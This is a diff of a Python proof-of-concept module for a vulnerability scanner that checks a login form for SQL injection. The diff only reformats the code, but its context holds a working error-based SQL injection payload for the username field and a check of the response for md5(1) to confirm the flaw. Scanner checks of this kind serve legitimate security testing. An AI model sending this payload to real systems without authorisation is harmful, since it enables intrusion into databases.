@@ -39,9 +39,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -53,7 +54,7 @@ class Poc(ABPoc):
             payload = 'username=test%27 and (select 1 from  (select count(*),concat(md5(1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&password=sdfasdf&Submit=%B5%C7+%C2%BC'
             md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
             code, head, res, err, _ = hh.http(url, post=payload)
-            #print res
+            # print res
             if code != 0 and md5_1 in res:
                 #security_hole('SQL Injection: ' +arg+' POST:' + payload)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
